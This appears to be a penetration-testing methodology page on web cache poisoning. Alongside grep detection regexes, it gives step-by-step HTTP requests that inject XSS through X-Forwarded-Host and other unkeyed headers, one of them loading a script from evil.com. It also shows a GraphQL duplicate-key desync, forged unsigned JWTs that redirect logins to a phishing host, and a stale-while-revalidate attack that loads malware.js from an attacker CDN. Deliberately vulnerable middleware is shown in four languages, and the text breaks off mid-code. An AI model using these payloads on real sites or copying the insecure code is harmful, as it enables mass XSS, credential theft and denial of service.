# Web Cache Poisoning

## Check List

## Methodology

### Black Box

#### Web Cache Poisoning via X-Forwarded-Host Header Injection

{% stepper %}
{% step %}
Navigate to the target web application and identify whether the application reflects the value of the X-Forwarded-Host header in the HTTP response
{% endstep %}

{% step %}
Using Burp Suite, intercept the request and inject a malicious payload into the X-Forwarded-Host header:

```http
GET /?xx HTTP/1.1
Host: meta.discourse.org
X-Forwarded-Host: cacheattack'"><script>alert(document.domain)</script>
```
{% endstep %}

{% step %}
Send the request and observe the server response to check whether the injected payload is reflected and processed in the HTML response
{% endstep %}

{% step %}
Then verify whether the HTTP response is cached by the application
{% endstep %}

{% step %}
Send the request with the same headers (Request Start Line, Accept, Accept-Encoding) and access the cached page

```http
GET /?xx HTTP/1.1
Host: meta.discourse.org
Accept: text/html
Accept-Encoding: gzip, deflate
```
{% endstep %}

{% step %}
Observe the server response and check whether the injected payload is served from the cache and executed for subsequent users
{% endstep %}

{% step %}
If the injected payload is stored in the cache and executed for other users, the vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### Web Cache Poisoning via Unkeyed Header Injection

{% stepper %}
{% step %}
Navigate to the target web application and identify whether the application uses any form of web cache such as CDN cache, reverse proxy cache, or browser cache
{% endstep %}

{% step %}
Send an initial request with a harmless parameter to determine cache behavior

```http
GET /?lang=en HTTP/1.1
Host: victim.com
Accept-Language: en
```
{% endstep %}

{% step %}
Observe the server response and check for cache-related headers such as

```http
Cache-Control: public
X-Cache: MISS
Age: 0
```
{% endstep %}

{% step %}
Send the same request again

```http
GET /?lang=en HTTP/1.1
Host: victim.com
Accept-Language: en
```
{% endstep %}

{% step %}
If the response now contains

```http
X-Cache: HIT
Age: >0
```
{% endstep %}

{% step %}
This confirms that the response is being cached by the application, Intercept the request using a proxy tool and modify an unkeyed header or parameter that may be processed by the application but ignored by the cache key
{% endstep %}

{% step %}
Inject a malicious payload into the header

```http
GET /?lang=en HTTP/1.1
Host: victim.com
Accept-Language: en"><script src=//evil.com/x.js></script>
```
{% endstep %}

{% step %}
Send the request and observe whether the injected value is reflected in the HTML response
{% endstep %}

{% step %}
Repeat the same request from a different session or IP address using identical cache key headers

```http
GET /?lang=en HTTP/1.1
Host: victim.com
Accept: text/html
Accept-Encoding: gzip, deflate
```
{% endstep %}

{% step %}
Observe the server response and verify whether the injected payload is served from cache to subsequent users
{% endstep %}

{% step %}
If the payload is cached and executed for multiple users until the cache expires, the Web Cache Poisoning vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### Web Cache Poisoning via Path Normalization Discrepancy

{% stepper %}
{% step %}
Go to the target site.
{% endstep %}

{% step %}
Intercept a legitimate request to a JavaScript file
{% endstep %}

{% step %}
Replace forward slashes with backslashes in the path
{% endstep %}

{% step %}
Add a cache buster parameter (`?test=123`) to avoid affecting live traffic
{% endstep %}

{% step %}
Send the malformed request multiple times until cached
{% endstep %}

{% step %}
Result: The 404 response gets cached, causing DoS for all subsequent requests
{% endstep %}

{% step %}
You can use double slash `(//)` techniques or Unicode characters
{% endstep %}
{% endstepper %}

***

### White Box

#### Cache-Key Desynchronization via Fast-Path JSON Parsing in GraphQL Edge Nodes

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on enterprise GraphQL architectures that utilize API Gateways or CDNs to cache highly requested queries (x\``GetPublicConfig`, `GetGlobalNavigation`)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the GraphQL caching bottleneck: By design, GraphQL operates over HTTP `POST` requests, encapsulating the query and variables within a JSON body. Traditional CDNs only cache `GET` requests based on the URL
{% endstep %}

{% step %}
Investigate the "POST Caching" optimization layer. To cache GraphQL responses at the edge, developers configure the API Gateway (e.g., Apollo Router, Kong, Nginx with custom Lua) to construct a custom Cache-Key by extracting specific fields directly from the incoming JSON payload (typically the `operationName`)
{% endstep %}

{% step %}
Analyze the JSON extraction mechanism inside the Edge Gateway. To avoid the massive memory overhead of building a complete Abstract Syntax Tree (AST) for millions of incoming JSON requests per second, the Gateway uses a "fast-path" string parser or a shallow regex (e.g., searching for the first occurrence of `"operationName"\s*:\s*"([^"]+)"`) to synthesize the Cache-Key
{% endstep %}

{% step %}
Understand the downstream GraphQL execution engine. The backend microservice utilizes a robust, specification-compliant JSON parser (e.g., Jackson, System.Text.Json) which fully deserializes the HTTP body into a hierarchical object graph
{% endstep %}

{% step %}
Discover the parsing desynchronization: Standard JSON parsers exhibit "Last-Key-Wins" behavior when encountering duplicate keys in a JSON object. However, the Edge Gateway's fast-path regex captures the _first_ occurrence of the key
{% endstep %}

{% step %}
Locate a GraphQL query that returns user-controlled data or reflects input without HTML encoding (e.g., an error-generating query or a profile-fetching query where you control the profile name)
{% endstep %}

{% step %}
Formulate the JSON Smuggling payload. Construct a GraphQL request containing two identically named `operationName` keys
{% endstep %}

{% step %}
Set the _first_ `operationName` to the highly requested, publicly cached query (e.g., `GetPublicConfig`). Set the _second_ `operationName` to the malicious, input-reflecting query (e.g., `SearchUser`)
{% endstep %}

{% step %}
Inject your XSS payload into the variables associated with the second query
{% endstep %}

{% step %}
Transmit the HTTP POST request to the API Gateway
{% endstep %}

{% step %}
The API Gateway fast-path scanner identifies the first key (`GetPublicConfig`), assumes the request is for the global configuration, and assigns the Cache-Key accordingly. It passes the full payload downstream
{% endstep %}

{% step %}
The backend JSON parser constructs the object, overrides the first operation with the second, executes the `SearchUser` query, and reflects the XSS payload. The Gateway receives the response and caches the attacker's XSS payload under the authoritative `GetPublicConfig` Cache-Key, poisoning the application for all subsequent users

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:CacheKey\s*=\s*Regex\.Match\s*\([^,]+,\s*"\\?"operationName\\?"\s*:\s*\\?"([^\\"]+)\\?"\)|String\s+operationName\s*=\s*extractFastPath\s*\([^)]*"operationName"[^)]*\)|Regex\.Match[\s\S]{0,150}?operationName[\s\S]{0,120}?(?:CacheKey|cache|lookup)|operationName[\s\S]{0,120}?Regex\.Match)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:String\s+operationName\s*=\s*extractFastPath\s*\([^)]*"operationName"[^)]*\)|Pattern\.compile\s*\([^)]*operationName[^)]*\)[\s\S]{0,150}?matcher|Matcher[\s\S]{0,120}?operationName|operationName[\s\S]{0,120}?extractFastPath)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:preg_match\s*\(\s*['"]/.*operationName.*['"]\s*,\s*\$rawBody|preg_match[\s\S]{0,150}?operationName[\s\S]{0,100}?(?:cache|CacheKey)|json_decode\s*\(\s*\$rawBody\s*,\s*false\s*\)[\s\S]{0,120}?operationName)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:const\s+opMatch\s*=\s*req\.body\.match\s*\(/.*operationName.*\/\)|req\.body\.match[\s\S]{0,150}?operationName[\s\S]{0,120}?(?:cache|cacheKey)|operationName[\s\S]{0,120}?match\s*\(/)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
CacheKey\s*=\s*Regex\.Match\(.*operationName|Regex\.Match.*operationName.*CacheKey|operationName.*Regex\.Match
```
{% endtab %}

{% tab title="Java" %}
```regexp
String\s+operationName\s*=\s*extractFastPath\(.*operationName|Pattern\.compile.*operationName|Matcher.*operationName
```
{% endtab %}

{% tab title="PHP" %}
```regexp
preg_match\(.*operationName.*\$rawBody|preg_match.*operationName.*cache|json_decode.*operationName
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
const\s+opMatch\s*=.*req\.body\.match\(.*operationName|req\.body\.match.*operationName.*cache|operationName.*match\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class GraphQlCachingMiddleware 
{
    private readonly IDistributedCache _edgeCache;

    public async Task InvokeAsync(HttpContext context, RequestDelegate next) 
    {
        context.Request.EnableBuffering();
        using var reader = new StreamReader(context.Request.Body, leaveOpen: true);
        var rawBody = await reader.ReadToEndAsync();
        context.Request.Body.Position = 0;

        // [1]
        // [2]
        // Fast-path extraction to avoid Newtonsoft.Json memory allocations on edge
        var match = Regex.Match(rawBody, "\"operationName\"\\s*:\\s*\"([^\"]+)\"");
        
        if (match.Success) 
        {
            // [3]
            var operationName = match.Groups[1].Value;
            var cacheKey = $"graphql:query:{operationName}";

            var cachedResponse = await _edgeCache.GetStringAsync(cacheKey);
            if (!string.IsNullOrEmpty(cachedResponse)) 
            {
                context.Response.ContentType = "application/json";
                await context.Response.WriteAsync(cachedResponse);
                return;
            }

            // [4]
            // Store a reference to cache the downstream response later
            context.Items["CacheKey"] = cacheKey; 
        }

        await next(context);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class GraphQlCachingFilter implements Filter {

    @Autowired
    private CacheManager edgeCache;

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        CachedBodyHttpServletRequest req = new CachedBodyHttpServletRequest((HttpServletRequest) request);
        String rawBody = req.getReader().lines().collect(Collectors.joining(System.lineSeparator()));

        // [1]
        // [2]
        Pattern pattern = Pattern.compile("\"operationName\"\\s*:\\s*\"([^\"]+)\"");
        Matcher matcher = pattern.matcher(rawBody);

        if (matcher.find()) {
            // [3]
            String operationName = matcher.group(1);
            String cacheKey = "graphql:query:" + operationName;

            Cache.ValueWrapper cached = edgeCache.getCache("graphql").get(cacheKey);
            if (cached != null) {
                response.setContentType("application/json");
                response.getWriter().write((String) cached.get());
                return;
            }

            // [4]
            req.setAttribute("CacheKey", cacheKey);
        }

        chain.doFilter(req, response);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class GraphQlCachingMiddleware 
{
    protected $edgeCache;

    public function handle(Request $request, Closure $next) 
    {
        $rawBody = $request->getContent();

        // [1]
        // [2]
        if (preg_match('/"operationName"\s*:\s*"([^"]+)"/', $rawBody, $matches)) 
        {
            // [3]
            $operationName = $matches[1];
            $cacheKey = "graphql:query:{$operationName}";

            $cachedResponse = $this->edgeCache->get($cacheKey);
            if ($cachedResponse) {
                return response($cachedResponse, 200)->header('Content-Type', 'application/json');
            }

            // [4]
            $request->attributes->set('CacheKey', $cacheKey);
        }

        return $next($request);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class GraphQlCachingMiddleware {
    static async handle(req, res, next) {
        let rawBody = req.rawBody; // Assumes a raw body buffer middleware ran prior

        // [1]
        // [2]
        const opMatch = rawBody.match(/"operationName"\s*:\s*"([^"]+)"/);

        if (opMatch && opMatch[1]) {
            // [3]
            let operationName = opMatch[1];
            let cacheKey = `graphql:query:${operationName}`;

            let cachedResponse = await edgeCache.get(cacheKey);
            if (cachedResponse) {
                res.set('Content-Type', 'application/json');
                return res.send(cachedResponse);
            }

            // [4]
            req.cacheKey = cacheKey;
        }

        next();
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The Edge Gateway evaluates the incoming HTTP POST request to determine if the GraphQL query is eligible for caching, \[2] To circumvent the massive CPU overhead of building full JSON trees for every ingress request, the developer employs a high-speed Regex scanner, \[3] The scanner intrinsically selects the _first_ matching `operationName` found in the byte stream, deriving the authoritative Cache-Key from this value, \[4] The architecture passes the request to the downstream backend and instructs the response interceptor to cache the ultimate result against the synthesized key. The desynchronization occurs because the downstream GraphQL engine utilizes a robust JSON parser that implements "Last-Key-Wins" overrides. The Gateway caches the execution result of the _last_ operation under the Cache-Key of the _first_ operation

```http
// 1. Attacker identifies a heavily utilized, globally cached GraphQL query: GetGlobalNavigation
// 2. Attacker identifies an uncacheable query that reflects arbitrary input: SearchProfiles
// 3. Attacker crafts the JSON Smuggling payload.

POST /graphql HTTP/1.1
Host: api.enterprise.tld
Content-Type: application/json

{
  "operationName": "GetGlobalNavigation",
  "query": "query SearchProfiles($term: String!) { search(term: $term) { results } }",
  "variables": { "term": "<img src=x onerror=alert(document.domain)>" },
  "operationName": "SearchProfiles"
}

// 4. The Edge Gateway regex captures the first key: GetGlobalNavigation.
// 5. The Backend GraphQL parser overrides the key, executing SearchProfiles.
// 6. The Backend returns the XSS payload.
// 7. The Edge Gateway caches the XSS payload under the cache key 'graphql:query:GetGlobalNavigation'.

// 8. Legitimate Victim requests the application. The SPA queries GetGlobalNavigation.
// 9. The CDN serves the poisoned cache block, executing the XSS payload in the victim's browser.
```
{% endstep %}

{% step %}
To introduce high-performance caching to HTTP POST-based GraphQL endpoints, enterprise architects implemented a fast-path caching middleware at the API Gateway layer. By utilizing Regex to synthesize the Cache-Key, the engineers bypassed secure JSON Abstract Syntax Tree parsing, assuming external payloads would remain structurally linear. The attacker weaponized the architectural discrepancy between the Gateway's fast-path regex and the backend's strict JSON deserializer by injecting duplicate keys. The Gateway securely mapped the Cache-Key to the benign public query, while the backend engine executed the malicious input-reflecting query. This parser differential allowed the attacker to poison the global Cache-Key of a mission-critical infrastructure component, resulting in a systemic, organization-wide Cross-Site Scripting (XSS) compromise
{% endstep %}
{% endstepper %}

***

#### Organization-Wide Account Takeover via JWT Claim Synthesis in Multi-Tenant Edge Routing

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on hyper-scale SaaS applications utilizing Serverless Edge Compute (Cloudflare Workers, Lambda@Edge, Fastly Compute@Edge) to manage multi-tenant routing and caching
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the Edge proxy configurations and backend routing logic
{% endstep %}

{% step %}
Identify the "Tenant-Partitioned Caching" architecture. To ensure Tenant A never accidentally views Tenant B's custom branding, SSO redirect URLs, or white-labeled assets, the Edge Compute layer must append the user's `TenantId` to every synthesized Cache-Key (e.g., `tenant_991_custom_theme`)
{% endstep %}

{% step %}
Investigate the Edge JWT optimization bottleneck: Performing cryptographic RSA/ECDSA signature validation on every single ingress request at the edge consumes enormous amounts of compute time, drastically increasing cloud billing
{% endstep %}

{% step %}
Discover the optimization: The Edge Compute developers assume that the heavy backend API Gateway will thoroughly validate the JWT signature. Therefore, to rapidly synthesize the Cache-Key, the Edge script simply parses the Base64 JSON payload of the incoming `Authorization` header _without verifying the cryptographic signature_, extracts the `tenant_id` claim, and builds the Cache-Key
{% endstep %}

{% step %}
Analyze the backend response behavior. If a user requests a protected asset without a valid session, the backend API Gateway rejects the invalid JWT. However, instead of a simple `401 Unauthorized`, the backend issues a `302 Found` redirecting the user to their specific organization's Single Sign-On (SSO) provider
{% endstep %}

{% step %}
Discover the unkeyed reflection boundary: To ensure the SSO provider knows where to send the user back after login, the backend dynamically constructs the redirect URL using an unkeyed header like `X-Forwarded-Host` or `Origin` (`Location: [https://sso.enterprise.com/?returnTo=https://](https://sso.enterprise.com/?returnTo=https://){X-Forwarded-Host}/dashboard`)
{% endstep %}

{% step %}
Understand the fatal incubation flow: The Edge Compute layer caches this `302 Redirect` response. Because the Edge extracts the `tenant_id` from the spoofed JWT, it caches the response _under the target victim's authoritative Cache-Key_
{% endstep %}

{% step %}
Formulate the Cache Poisoning payload. Generate a completely forged JWT. You do not need the cryptographic signing key. Set the `tenant_id` claim in the JSON body to the Target Victim's Tenant ID, and encode it in Base64
{% endstep %}

{% step %}
Send a request to the targeted asset endpoint using the forged JWT
{% endstep %}

{% step %}
Simultaneously, inject a poisoned, unkeyed routing header (e.g., `X-Forwarded-Host: attacker-controlled-sso.com`)
{% endstep %}

{% step %}
The Edge Compute layer decodes the forged JWT, extracts the Victim's Tenant ID, and registers the Cache-Key as `tenant_VICTIM_asset`. It forwards the request downstream
{% endstep %}

{% step %}
The backend API Gateway detects the invalid JWT signature. It initiates the SSO redirect flow. It interpolates your poisoned `X-Forwarded-Host` into the `returnTo` parameter and returns the `302 Found` response
{% endstep %}

{% step %}
The Edge Compute layer receives the `302 Found` and caches it against `tenant_VICTIM_asset`. When legitimate users from the victim organization attempt to log in, the Edge serves the poisoned redirect, funneling the entire organization's authentication flow to the attacker's phishing infrastructure

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:CacheKey\s*=\s*\$"tenant_\{(?:ExtractUnverifiedClaim|ReadJwtToken|ReadToken|DecodeJwt|ParseJwt)[^}]*\}_|ExtractUnverifiedClaim\s*\([^)]*\)[\s\S]{0,120}?(?:CacheKey|tenant_|cache)|JwtSecurityTokenHandler\.ReadJwtToken[\s\S]{0,150}?(?:tenant_id|sub|iss|aud|role)[\s\S]{0,120}?(?:CacheKey|cache))
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:String\s+cacheKey\s*=\s*"tenant_"\s*\+\s*(?:getUnverifiedClaim|JWT\.decode|DecodedJWT|getClaim)\s*\(|JWT\.decode\s*\([^)]*\)[\s\S]{0,150}?(?:tenant_id|sub|iss|aud|role)[\s\S]{0,120}?(?:cache|CacheKey)|DecodedJWT[\s\S]{0,120}?(?:tenant_id|sub|role))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$cacheKey\s*=\s*"tenant_"\s*\.\s*(?:base64_decode|json_decode|JWT::decode)[\s\S]{0,150}?->(?:tenant_id|sub|iss|aud|role)|base64_decode\s*\([^)]*\)[\s\S]{0,120}?tenant_id[\s\S]{0,120}?cache|json_decode\s*\([^)]*\)[\s\S]{0,120}?tenant_id)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:cacheKey\s*=\s*`tenant_\$\{(?:decodeJwt|jwt\.decode|decode)\([^)]*\)\.(?:tenant_id|sub|iss|aud|role)\}_|jwt\.decode\s*\([^)]*\)[\s\S]{0,150}?(?:tenant_id|sub|role)[\s\S]{0,120}?(?:cache|cacheKey)|decodeJwt\s*\([^)]*\)[\s\S]{0,120}?tenant_id)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
CacheKey\s*=\s*\$"tenant_\{(ExtractUnverifiedClaim|ReadJwtToken|DecodeJwt).*|JwtSecurityTokenHandler\.ReadJwtToken.*(tenant_id|sub|iss|aud|role).*CacheKey
```
{% endtab %}

{% tab title="Java" %}
```regexp
String\s+cacheKey\s*=\s*"tenant_"\s*\+\s*getUnverifiedClaim|JWT\.decode.*(tenant_id|sub|iss|aud|role)|DecodedJWT.*tenant_id
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$cacheKey\s*=\s*"tenant_"\.base64_decode\(.*->tenant_id|base64_decode.*tenant_id.*cache|json_decode.*tenant_id
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
cacheKey\s*=\s*`tenant_\$\{decodeJwt\(.*\)\.(tenant_id|sub|iss|aud|role)\}_|jwt\.decode.*tenant_id.*cache|decodeJwt.*tenant_id
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
// Edge Compute / YARP Reverse Proxy Logic
public class EdgeCachingMiddleware 
{
    public async Task InvokeAsync(HttpContext context, RequestDelegate next) 
    {
        var authHeader = context.Request.Headers["Authorization"].ToString();
        string tenantId = "anonymous";

        // [1]
        // [2]
        // Extracting JWT claims WITHOUT verifying the signature for edge performance
        if (!string.IsNullOrEmpty(authHeader) && authHeader.StartsWith("Bearer ")) 
        {
            var tokenParts = authHeader.Substring(7).Split('.');
            if (tokenParts.Length == 3) 
            {
                var payloadJson = Encoding.UTF8.GetString(Convert.FromBase64String(PadBase64(tokenParts[1])));
                var payload = JObject.Parse(payloadJson);
                tenantId = payload["tenant_id"]?.ToString() ?? "anonymous";
            }
        }

        // [3]
        var cacheKey = $"tenant_{tenantId}_{context.Request.Path}";
        
        // Caching logic execution...
        // [4]
        // Caches the downstream 302 Redirect under the victim's tenant ID
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
// Spring Cloud Gateway / Zuul Edge Logic
@Component
public class EdgeCachingFilter implements GlobalFilter {

    @Override
    public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {
        String authHeader = exchange.getRequest().getHeaders().getFirst("Authorization");
        String tenantId = "anonymous";

        // [1]
        // [2]
        if (authHeader != null && authHeader.startsWith("Bearer ")) {
            String[] parts = authHeader.substring(7).split("\\.");
            if (parts.length == 3) {
                String payloadJson = new String(Base64.getUrlDecoder().decode(parts[1]));
                JsonNode payload = new ObjectMapper().readTree(payloadJson);
                if (payload.has("tenant_id")) {
                    tenantId = payload.get("tenant_id").asText();
                }
            }
        }

        // [3]
        String cacheKey = "tenant_" + tenantId + "_" + exchange.getRequest().getPath();

        // [4]
        // Proceeds to cache the response (even 302/401 errors) against the synthesized key
        return chain.filter(exchange);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
// Custom Varnish / Nginx Lua equivalent logic represented in PHP edge
class EdgeCachingMiddleware 
{
    public function handle(Request $request, Closure $next) 
    {
        $authHeader = $request->header('Authorization');
        $tenantId = 'anonymous';

        // [1]
        // [2]
        if ($authHeader && str_starts_with($authHeader, 'Bearer ')) {
            $parts = explode('.', substr($authHeader, 7));
            if (count($parts) === 3) {
                $payload = json_decode(base64_decode($parts[1]), true);
                $tenantId = $payload['tenant_id'] ?? 'anonymous';
            }
        }

        // [3]
        $cacheKey = "tenant_{$tenantId}_" . $request->getPathInfo();

        // [4]
        // Cache execution and storage logic
        return $next($request);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
// Cloudflare Worker / Lambda@Edge representation
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
    let authHeader = request.headers.get('Authorization');
    let tenantId = 'anonymous';

    // [1]
    // [2]
    if (authHeader && authHeader.startsWith('Bearer ')) {
        let parts = authHeader.split(' ')[1].split('.');
        if (parts.length === 3) {
            let payload = JSON.parse(atob(parts[1]));
            tenantId = payload.tenant_id || 'anonymous';
        }
    }

    // [3]
    let cacheKey = `https://edge.internal/tenant_${tenantId}_${new URL(request.url).pathname}`;

    let cache = caches.default;
    let response = await cache.match(cacheKey);

    if (!response) {
        // [4]
        response = await fetch(request);
        // The edge caches the backend's 302 Redirect response
        event.waitUntil(cache.put(cacheKey, response.clone()));
    }

    return response;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The Edge Compute layer is strictly responsible for routing and caching to minimize load on the core transactional databases, \[2] To partition the cache efficiently without incurring cryptographic CPU penalties, the developer decodes the Base64 JWT payload but explicitly skips signature verification, \[3] The architecture intrinsically trusts that an invalid JWT will simply be rejected by the backend, rendering the spoofed Cache-Key harmless, \[4] The fatal boundary intersection. The backend _does_ reject the invalid token, but it attempts to gracefully recover by dynamically generating a `302 Redirect` to the SSO provider. Because the redirect URL incorporates the unkeyed `X-Forwarded-Host` header, the attacker successfully poisons the payload. The Edge caching engine dutifully stores this poisoned redirect under the _Victim's_ legitimate Cache-Key

```http
// 1. Attacker generates a fake JWT. They set {"tenant_id": "VICTIM_ORG"} in the payload.
// They sign it with a random garbage key.

// 2. Attacker sends a request to a heavily cached endpoint that requires authentication.
// They inject the X-Forwarded-Host header pointing to their phishing infrastructure.
GET /api/v1/workspace/config HTTP/1.1
Host: app.enterprise.tld
X-Forwarded-Host: sso-enterprise-login-update.com
Authorization: Bearer <spoofed_unverified_jwt>

// 3. The Edge Proxy extracts 'VICTIM_ORG' from the fake JWT and generates the cache key:
// Cache-Key: tenant_VICTIM_ORG_/api/v1/workspace/config

// 4. The Edge Proxy forwards the request to the Backend API Gateway.
// 5. The Backend Gateway detects the invalid JWT signature. It generates a 302 Redirect to the SSO portal,
// utilizing the poisoned X-Forwarded-Host header to define the "returnTo" parameter.
HTTP/1.1 302 Found
Location: https://sso.enterprise.tld/login?returnTo=https://sso-enterprise-login-update.com/dashboard
Cache-Control: public, max-age=3600

// 6. The Edge Proxy receives the 302 Redirect and caches it under the VICTIM_ORG key.

// 7. Legitimate Victim (from VICTIM_ORG) browses to the application.
// 8. The Edge Proxy matches the legitimate user to the poisoned Cache-Key and serves the 302 Redirect.
// 9. The Victim logs in via the legitimate SSO portal, but is seamlessly redirected to the attacker's 
// phishing site, exfiltrating the active session token.
```
{% endstep %}

{% step %}
To manage massive multi-tenant data caching without overwhelming edge compute resources, architects decoupled JWT signature verification from JWT payload extraction. They assumed that spoofed claims would inevitably result in inert access denials at the backend layer. They failed to recognize that modern authentication flows often return dynamic, stateful `302 Redirect` errors to facilitate seamless user SSO onboarding. By submitting a cryptographically invalid token containing a target victim's identifier alongside a manipulated routing header, the attacker forced the backend to generate a poisoned redirect payload. The Edge Compute layer, acting on its asymmetric trust model, cached this poisoned redirect against the target victim's authoritative tenant key. The vulnerability propagated outward, transforming a localized header reflection into an asynchronous, organization-wide credential harvesting pipeline
{% endstep %}
{% endstepper %}

***

#### Remote Asset Injection via Asynchronous Stale-While-Revalidate Context Bleeding

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on modern frontend applications leveraging Server-Side Rendering (SSR) frameworks (e.g., Next.js, Nuxt.js) backed by enterprise CDNs (e.g., Vercel, Akamai, Cloudflare).
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the `stale-while-revalidate` (SWR) caching architecture. To guarantee zero-latency page loads for high-traffic endpoints (like landing pages or public dashboards), the CDN is configured to instantly serve a "stale" cached HTML response to the user. Simultaneously, the CDN spawns an asynchronous background thread to fetch the latest data from the backend and silently update the cache
{% endstep %}

{% step %}
Investigate the execution context of the asynchronous background fetch. When the CDN triggers the revalidation request to the backend SSR engine, it must construct an HTTP request
{% endstep %}

{% step %}
Discover the "Header Passthrough" optimization. To ensure the backend SSR engine has the necessary context to render the page (e.g., Device type, User-Agent, Language), the CDN background worker blindly copies the HTTP headers from the _triggering request_ into the background revalidation request
{% endstep %}

{% step %}
Analyze the backend SSR rendering pipeline. Notice that the application utilizes a middleware to dynamically construct internal Asset URLs or API Base URLs by reading the incoming `X-Forwarded-Host` or `X-Original-Host` headers (`<script src="https://{X-Forwarded-Host}/_next/static/chunks/main.js"></script>`)
{% endstep %}

{% step %}
Understand the testing paradox: If you inject `X-Forwarded-Host` into a normal request, the CDN serves the _cached_ safe version, and you see no reflection. Black-box scanners immediately mark the endpoint as secure
{% endstep %}

{% step %}
Recognize the asynchronous incubation boundary. The attacker's injected header is absorbed by the CDN and transferred into the asynchronous SWR background worker
{% endstep %}

{% step %}
Formulate the Context Bleeding payload. Determine the exact Cache-Control timeout thresholds (e.g., `s-maxage=60, stale-while-revalidate=300`)
{% endstep %}

{% step %}
Wait for the cache to enter the "stale" window (61 seconds after the last update)
{% endstep %}

{% step %}
Send a request to the target page, injecting `X-Forwarded-Host: [attacker-controlled-cdn.com/malware.js](https://attacker-controlled-cdn.com/malware.js)?`
{% endstep %}

{% step %}
The CDN instantly serves you the safe, stale HTML (masking the vulnerability)
{% endstep %}

{% step %}
Behind the scenes, the CDN spawns the background revalidation request, passing your poisoned `X-Forwarded-Host` header to the backend SSR server
{% endstep %}

{% step %}
The backend SSR engine renders the new HTML document, interpolating your attacker domain into the core `<script>` asset tags. It returns the poisoned HTML to the CDN. The CDN overwrites the authoritative cache with the poisoned document. All subsequent users accessing the application receive the compromised HTML, executing the attacker's JavaScript globally

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Cache-Control[\s\S]{0,100}?stale-while-revalidate|Response\.Headers\s*\[\s*"Cache-Control"\s*\]\s*=\s*[\s\S]{0,150}?stale-while-revalidate|Response\.Headers\.Add\s*\(\s*"Cache-Control"[\s\S]{0,150}?stale-while-revalidate|SetCacheability[\s\S]{0,100}?stale-while-revalidate)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:response\.setHeader\s*\(\s*"Cache-Control"[\s\S]{0,150}?stale-while-revalidate|headers\.add\s*\(\s*"Cache-Control"[\s\S]{0,150}?stale-while-revalidate|Cache-Control[\s\S]{0,100}?stale-while-revalidate)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:header\s*\(\s*['"]Cache-Control:\s*[\s\S]{0,150}?stale-while-revalidate['"]\)|response\(\)[\s\S]{0,120}?header[\s\S]{0,100}?stale-while-revalidate|Cache-Control.*stale-while-revalidate)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:res\.setHeader\s*\(\s*['"]Cache-Control['"]\s*,[\s\S]{0,150}?stale-while-revalidate['"]\)|res\.header\s*\(\s*['"]Cache-Control['"]|response\.setHeader[\s\S]{0,120}?stale-while-revalidate|Cache-Control.*stale-while-revalidate)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Cache-Control.*stale-while-revalidate|Response\.Headers\["Cache-Control"\].*stale-while-revalidate|Response\.Headers\.Add.*stale-while-revalidate
```
{% endtab %}

{% tab title="Java" %}
```regexp
response\.setHeader\("Cache-Control".*stale-while-revalidate|headers\.add\("Cache-Control".*stale-while-revalidate|Cache-Control.*stale-while-revalidate
```
{% endtab %}

{% tab title="PHP" %}
```regexp
header\('Cache-Control:\s*.*stale-while-revalidate'\)|Cache-Control.*stale-while-revalidate
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
res\.setHeader\('Cache-Control',\s*.*stale-while-revalidate'\)|res\.header\(.*Cache-Control.*stale-while-revalidate|Cache-Control.*stale-while-revalidate
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class SsrRenderingController : Controller
{
    [HttpGet("/public/dashboard")]
    public IActionResult RenderDashboard()
    {
        // [1]
        // [2]
